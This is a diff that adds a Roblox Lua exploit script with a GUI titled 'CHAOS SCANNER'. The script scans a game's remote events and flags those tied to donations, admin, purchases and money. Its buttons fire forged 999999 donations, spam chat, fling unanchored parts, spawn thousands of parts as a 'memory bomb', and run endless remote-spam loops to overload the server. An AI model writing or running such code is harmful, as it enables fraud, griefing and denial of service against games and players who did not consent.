@@ -1,5 +1,197 @@
-print("Test 1")
 local Player = game.Players.LocalPlayer
-print("Test 2")
 local PlayerGui = Player:WaitForChild("PlayerGui")
-print("Test 3")
+local UIS = game:GetService("UserInputService")
+local RS = game:GetService("ReplicatedStorage")
+local WS = game:GetService("Workspace")
+local CG = game:GetService("CoreGui")
+
+local Config = {
+    Theme = {
+        Primary = Color3.fromRGB(138, 43, 226),
+        Secondary = Color3.fromRGB(75, 0, 130),
+        Success = Color3.fromRGB(46, 204, 113),
+        Warning = Color3.fromRGB(241, 196, 15),
+        Danger = Color3.fromRGB(231, 76, 60),
+        Background = Color3.fromRGB(23, 23, 23),
+        Text = Color3.fromRGB(255, 255, 255)
+    }
+}
+
+local Scanner = {Results = {RemoteEvents = {}, Objects = {}}, Stats = {TotalScanned = 0, HighRisk = 0, MediumRisk = 0, LowRisk = 0}}
+local Executor = {}
+local UI = {}
+
+function Scanner:ScanRemoteEvents()
+    local remotes = {}
+    for _, obj in pairs(RS:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            local name = obj.Name:lower()
+            local risk = "Low"
+            if name:find("donation") or name:find("tip") or name:find("admin") or name:find("purchase") or name:find("vip") or name:find("money") then risk = "High"
+            elseif name:find("chat") or name:find("teleport") or name:find("spawn") then risk = "Medium" end
+            table.insert(remotes, {Object = obj, Name = obj.Name, Type = obj.ClassName, Risk = risk})
+            self.Stats.TotalScanned = self.Stats.TotalScanned + 1
+            if risk == "High" then self.Stats.HighRisk = self.Stats.HighRisk + 1
+            elseif risk == "Medium" then self.Stats.MediumRisk = self.Stats.MediumRisk + 1
+            else self.Stats.LowRisk = self.Stats.LowRisk + 1 end
+        end
+    end
+    for _, obj in pairs(WS:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            local name = obj.Name:lower()
+            local risk = "Low"
+            if name:find("donation") or name:find("tip") or name:find("admin") or name:find("purchase") or name:find("vip") or name:find("money") then risk = "High"
+            elseif name:find("chat") or name:find("teleport") or name:find("spawn") then risk = "Medium" end
+            table.insert(remotes, {Object = obj, Name = obj.Name, Type = obj.ClassName, Risk = risk})
+            self.Stats.TotalScanned = self.Stats.TotalScanned + 1
+            if risk == "High" then self.Stats.HighRisk = self.Stats.HighRisk + 1
+            elseif risk == "Medium" then self.Stats.MediumRisk = self.Stats.MediumRisk + 1
+            else self.Stats.LowRisk = self.Stats.LowRisk + 1 end
+        end
+    end
+    self.Results.RemoteEvents = remotes
+    return remotes
+end
+
+function Scanner:ScanObjects()
+    local objects = {}
+    for _, obj in pairs(WS:GetDescendants()) do
+        if obj:IsA("BasePart") and not obj.Anchored then
+            table.insert(objects, {Object = obj, Name = obj.Name, Movable = true})
+        end
+    end
+    self.Results.Objects = objects
+    return objects
+end
+
+function Executor:FireRemote(remote, ...)
+    pcall(function()
+        if remote.Type == "RemoteEvent" then remote.Object:FireServer(...)
+        else remote.Object:InvokeServer(...) end
+    end)
+end
+
+function Executor:FakeDonation(remote, amount)
+    self:FireRemote(remote, {amount = amount or 999999, from = Player.Name, message = "CHAOS"})
+    self:FireRemote(remote, {Amount = amount or 999999, From = Player.Name, Message = "CHAOS"})
+end
+
+function Executor:SpamChat(remote, msg, count)
+    for i = 1, count or 5 do self:FireRemote(remote, msg or "CHAOS") wait(0.1) end
+end
+
+function Executor:MoveObject(obj, pos)
+    pcall(function()
+        if obj:IsA("BasePart") then obj.CFrame = CFrame.new(pos or Vector3.new(0, 1000, 0))
+        elseif obj:IsA("Model") and obj.PrimaryPart then obj:SetPrimaryPartCFrame(CFrame.new(pos or Vector3.new(0, 1000, 0))) end
+    end)
+end
+
+function Executor:ChaosMode()
+    for _, remote in pairs(Scanner.Results.RemoteEvents) do
+        if remote.Risk == "High" then spawn(function() for i = 1, 5 do self:FireRemote(remote, {chaos = true, value = 999999}) wait(0.5) end end) end
+    end
+    for _, obj in pairs(Scanner.Results.Objects) do
+        spawn(function() self:MoveObject(obj.Object, Vector3.new(math.random(-500, 500), 1000, math.random(-500, 500))) end)
+    end
+end
+
+function Executor:MemoryBomb()
+    for i = 1, 5000 do
+        spawn(function() pcall(function()
+            local p = Instance.new("Part")
+            p.Size = Vector3.new(math.random(10, 100), math.random(10, 100), math.random(10, 100))
+            p.Position = Vector3.new(math.random(-2000, 2000), math.random(0, 2000), math.random(-2000, 2000))
+            p.Anchored = false
+            p.Material = Enum.Material.Neon
+            p.BrickColor = BrickColor.Random()
+            p.Parent = WS
+        end) end)
+        if i % 100 == 0 then wait(0.1) end
+    end
+end
+
+function Executor:InfiniteSpam()
+    for i = 1, 100 do
+        spawn(function() while true do
+            for _, remote in pairs(Scanner.Results.RemoteEvents) do pcall(function() self:FireRemote(remote, {spam = true}) end) end
+            wait(0.001)
+        end end)
+    end
+end
+
+function Executor:ApocalypseMode()
+    for i = 1, 50 do spawn(function() while wait(0.01) do
+        for _, remote in pairs(Scanner.Results.RemoteEvents) do pcall(function() self:FireRemote(remote, {apocalypse = true}) end) end
+    end end) end
+    spawn(function() for i = 1, 1000 do pcall(function()
+        local p = Instance.new("Part")
+        p.Size = Vector3.new(50, 50, 50)
+        p.Position = Vector3.new(math.random(-1000, 1000), 500, math.random(-1000, 1000))
+        p.Anchored = false
+        p.Parent = WS
+    end) wait(0.01) end end)
+end
+
+function UI:Create()
+    local SG = Instance.new("ScreenGui") SG.Name = "ChaosScanner" SG.ResetOnSpawn = false SG.Parent = CG
+    local MF = Instance.new("Frame") MF.Size = UDim2.new(0, 600, 0, 500) MF.Position = UDim2.new(0.5, -300, 0.5, -250) MF.BackgroundColor3 = Config.Theme.Background MF.BorderSizePixel = 0 MF.Parent = SG
+    local C1 = Instance.new("UICorner") C1.CornerRadius = UDim.new(0, 12) C1.Parent = MF
+    local H = Instance.new("Frame") H.Size = UDim2.new(1, 0, 0, 60) H.BackgroundColor3 = Config.Theme.Primary H.BorderSizePixel = 0 H.Parent = MF
+    local C2 = Instance.new("UICorner") C2.CornerRadius = UDim.new(0, 12) C2.Parent = H
+    local T = Instance.new("TextLabel") T.Size = UDim2.new(0, 200, 1, 0) T.Position = UDim2.new(0, 10, 0, 0) T.BackgroundTransparency = 1 T.Text = "CHAOS SCANNER" T.TextColor3 = Config.Theme.Text T.TextSize = 20 T.Font = Enum.Font.GothamBold T.TextXAlignment = Enum.TextXAlignment.Left T.Parent = H
+    local CB = Instance.new("TextButton") CB.Size = UDim2.new(0, 40, 0, 40) CB.Position = UDim2.new(1, -50, 0.5, -20) CB.BackgroundColor3 = Config.Theme.Danger CB.Text = "X" CB.TextColor3 = Config.Theme.Text CB.TextSize = 20 CB.Font = Enum.Font.GothamBold CB.Parent = H
+    local C3 = Instance.new("UICorner") C3.CornerRadius = UDim.new(0, 8) C3.Parent = CB
+    CB.MouseButton1Click:Connect(function() SG:Destroy() end)
+    local SF = Instance.new("Frame") SF.Size = UDim2.new(1, -20, 0, 80) SF.Position = UDim2.new(0, 10, 0, 70) SF.BackgroundColor3 = Color3.fromRGB(30, 30, 30) SF.BorderSizePixel = 0 SF.Parent = MF
+    local C4 = Instance.new("UICorner") C4.CornerRadius = UDim.new(0, 8) C4.Parent = SF
+    local function CS(n, c, p)
+        local L = Instance.new("TextLabel") L.Size = UDim2.new(0.25, -10, 1, 0) L.Position = p L.BackgroundTransparency = 1 L.Text = "0" L.TextColor3 = c L.TextSize = 24 L.Font = Enum.Font.GothamBold L.Parent = SF
+        local N = Instance.new("TextLabel") N.Size = UDim2.new(1, 0, 0, 20) N.Position = UDim2.new(0, 0, 1, -25) N.BackgroundTransparency = 1 N.Text = n N.TextColor3 = Color3.fromRGB(150, 150, 150) N.TextSize = 12 N.Font = Enum.Font.Gotham N.Parent = L
+        return L
+    end
+    local TS = CS("TOTAL", Config.Theme.Text, UDim2.new(0, 5, 0, 10))
+    local HS = CS("HIGH", Config.Theme.Danger, UDim2.new(0.25, 5, 0, 10))
+    local MS = CS("MEDIUM", Config.Theme.Warning, UDim2.new(0.5, 5, 0, 10))
+    local LS = CS("LOW", Config.Theme.Success, UDim2.new(0.75, 5, 0, 10))
+    local CF = Instance.new("ScrollingFrame") CF.Size = UDim2.new(1, -20, 0, 250) CF.Position = UDim2.new(0, 10, 0, 160) CF.BackgroundColor3 = Color3.fromRGB(30, 30, 30) CF.BorderSizePixel = 0 CF.ScrollBarThickness = 6 CF.Parent = MF
+    local C5 = Instance.new("UICorner") C5.CornerRadius = UDim.new(0, 8) C5.Parent = CF
+    local CL = Instance.new("UIListLayout") CL.Padding = UDim.new(0, 5) CL.Parent = CF
+    local function CB2(txt, col, pos, cb)
+        local B = Instance.new("TextButton") B.Size = UDim2.new(0.32, -5, 1, 0) B.Position = pos B.BackgroundColor3 = col B.Text = txt B.TextColor3 = Config.Theme.Text B.TextSize = 12 B.Font = Enum.Font.GothamBold B.Parent = MF
+        local BC = Instance.new("UICorner") BC.CornerRadius = UDim.new(0, 8) BC.Parent = B
+        B.MouseButton1Click:Connect(cb)
+        return B
+    end
+    CB2("SCAN", Config.Theme.Primary, UDim2.new(0, 10, 1, -95), function()
+        CF:ClearAllChildren() CL.Parent = CF
+        Scanner:ScanRemoteEvents() Scanner:ScanObjects()
+        TS.Text = tostring(Scanner.Stats.TotalScanned) HS.Text = tostring(Scanner.Stats.HighRisk) MS.Text = tostring(Scanner.Stats.MediumRisk) LS.Text = tostring(Scanner.Stats.LowRisk)
+        for _, r in pairs(Scanner.Results.RemoteEvents) do
+            local I = Instance.new("Frame") I.Size = UDim2.new(1, -10, 0, 50) I.BackgroundColor3 = Color3.fromRGB(40, 40, 40) I.BorderSizePixel = 0 I.Parent = CF
+            local IC = Instance.new("UICorner") IC.CornerRadius = UDim.new(0, 6) IC.Parent = I
+            local NL = Instance.new("TextLabel") NL.Size = UDim2.new(0.6, -15, 0, 20) NL.Position = UDim2.new(0, 10, 0, 5) NL.BackgroundTransparency = 1 NL.Text = r.Name NL.TextColor3 = Config.Theme.Text NL.TextSize = 12 NL.Font = Enum.Font.GothamBold NL.TextXAlignment = Enum.TextXAlignment.Left NL.Parent = I
+            local TL = Instance.new("TextLabel") TL.Size = UDim2.new(0.6, -15, 0, 15) TL.Position = UDim2.new(0, 10, 0, 25) TL.BackgroundTransparency = 1 TL.Text = r.Type .. " | " .. r.Risk TL.TextColor3 = Color3.fromRGB(150, 150, 150) TL.TextSize = 10 TL.Font = Enum.Font.Gotham TL.TextXAlignment = Enum.TextXAlignment.Left TL.Parent = I
+            local EB = Instance.new("TextButton") EB.Size = UDim2.new(0, 70, 0, 25) EB.Position = UDim2.new(1, -80, 0.5, -12) EB.BackgroundColor3 = Config.Theme.Primary EB.Text = "EXEC" EB.TextColor3 = Config.Theme.Text EB.TextSize = 10 EB.Font = Enum.Font.GothamBold EB.Parent = I
+            local EC = Instance.new("UICorner") EC.CornerRadius = UDim.new(0, 6) EC.Parent = EB
+            EB.MouseButton1Click:Connect(function()
+                if r.Name:lower():find("donation") or r.Name:lower():find("tip") then Executor:FakeDonation(r, 999999)
+                elseif r.Name:lower():find("chat") then Executor:SpamChat(r, "CHAOS", 5)
+                else Executor:FireRemote(r, {chaos = true, value = 999999}) end
+                EB.Text = "DONE" EB.BackgroundColor3 = Config.Theme.Success wait(1) EB.Text = "EXEC" EB.BackgroundColor3 = Config.Theme.Primary
+            end)
+        end
+        CF.CanvasSize = UDim2.new(0, 0, 0, CL.AbsoluteContentSize.Y + 10)
+    end)
+    CB2("EXPLOIT", Config.Theme.Warning, UDim2.new(0.34, 10, 1, -95), function() for _, r in pairs(Scanner.Results.RemoteEvents) do if r.Risk == "High" then Executor:FireRemote(r, {chaos = true}) end end end)
+    CB2("CHAOS", Config.Theme.Danger, UDim2.new(0.68, 10, 1, -95), function() Executor:ChaosMode() end)
+    CB2("MEMORY", Color3.fromRGB(139, 0, 0), UDim2.new(0, 10, 1, -50), function() Executor:MemoryBomb() end)
+    CB2("SPAM", Color3.fromRGB(128, 0, 128), UDim2.new(0.34, 10, 1, -50), function() Executor:InfiniteSpam() end)
+    CB2("APOCALYPSE", Color3.fromRGB(0, 0, 0), UDim2.new(0.68, 10, 1, -50), function() Executor:ApocalypseMode() end)
+    return SG
+end
+
+UI:Create()
+wait(1)
+Scanner:ScanRemoteEvents()
+Scanner:ScanObjects()
